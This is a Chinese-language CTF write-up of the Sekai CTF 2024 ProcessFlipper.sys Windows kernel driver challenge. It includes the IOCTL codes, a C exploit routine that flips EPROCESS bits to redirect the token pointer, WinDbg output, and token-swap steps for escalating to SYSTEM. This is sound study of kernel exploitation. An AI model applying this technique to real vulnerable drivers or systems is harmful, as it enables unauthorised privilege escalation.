---
title: Sekai CTF ProcessFlipper.sys 驱动漏洞分析与利用
contest: Sekai CTF
year: 2024
difficulty: hard
vuln_type: misc_unknown
tags: [windows-kernel, eprocess-flip, kmdf-driver, token-priv-escalation, sys]
attack_chain:
- IDA 打开 ProcessFlipper.sys KMDF 驱动
- WdfDriverCreate/WdfBindInfo 入口
- 两个 IOCTL: 0x222004 (SET) / 0x222008 (CLEAR)
- 翻转 EPROCESS 内任意位 (offset < 0x5c00 = 0xb80*8)
- 通过 DiskCounters 字段构造 fake value
- patch_diskcounter 写 12 bit 触发 token pointer 覆盖
- NtQuerySystemInformation 遍历进程找目标 PID
- 改 _TOKEN.privileges.present + privileges.enabled
- 启用 SeDebugPrivilege 后 OpenSCManager 等
- 读 C:\flag.txt 完成 System 提权
- OpenSecurityTraining2 高级 Windbg 课
- 操作系统置 Test Mode + OSRLoader 加载驱动
key_payload: DeviceIoControl(file, IOCTL_PROCESS_SET/CLEAR, &BitToFlip, sizeof(BitToFlip), ...)
one_liner: Sekai CTF 2024 ProcessFlipper.sys：KMDF 驱动翻转 EPROCESS 任意位，本地权限提升至 SYSTEM。
lesson: 任意位翻转即使粒度小，配合 12 bit DiskCounters 构造可定向覆盖 EPROCESS 关键指针。
quality: high
---
# Sekai CTF 2024 – ProcessFlipper.sys 驱动漏洞

## 题目背景
- Windows 11 24H2，提交编译代码 → 自动化漏洞利用器运行 → 截图返回
- 驱动文件 `ProcessFlipper.sys`
- 灵感来自 `wfshbr64.sys` (能操纵 EPROCESS 任意位)

## 逆向要点
- IDA 需加 KMDF 驱动符号表
- `DriverEntry` 中 `WdfDriverCreate` / `WdfBindInfo`
- 两个 IOCTL：`0x222004` (SET) / `0x222008` (CLEAR)
- 偏移检查 `< 0x5c00 = 0xb80 * 8` (Windows 11 24H2 EPROCESS 大小)
- Vergilius 网站查 Token/DiskCounters 偏移

## 漏洞利用
```c
HANDLE file = CreateFileA("\\.\ProcessFlipper", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

bool patch_diskcounter(HANDLE file) {
    ULONG value = tokenoffset + 0x80 - 0x8;  // add 0x80 → token, sub 0x8 → BytesWritten 指向的目标
    for (int i = 0; i < 12; i++) {
        ULONG BitToFlip = diskCounterOffset * 8 + i;
        DWORD ioctlcode = (((ULONG_PTR)value >> i) & 1) ? IOCTL_PROCESS_SET : IOCTL_PROCESS_CLEAR;
        DeviceIoControl(file, ioctlcode, &BitToFlip, sizeof(BitToFlip), NULL, 0, &BytesReturned, NULL);
    }
}
```

## 调试
```windbg
kd> dqs ffffc703`d61b1080 + 8b8 l2
ffffc703`d61b1938  ffffc703`d61b1ac0   <---- DiskCounter
ffffc703`d61b1940  00000000`00000000
kd> dqs ffffc703`d61b1080 + 4b8 l2
ffffc703`d61b1538  ffff848a`436c0064   <---- token
```

## Token 提权方法
1. 替换目标进程 token 为 system (PID 4) 的 token
2. 改 _TOKEN.privileges.present + privileges.enabled 启用 SeDebugPrivilege
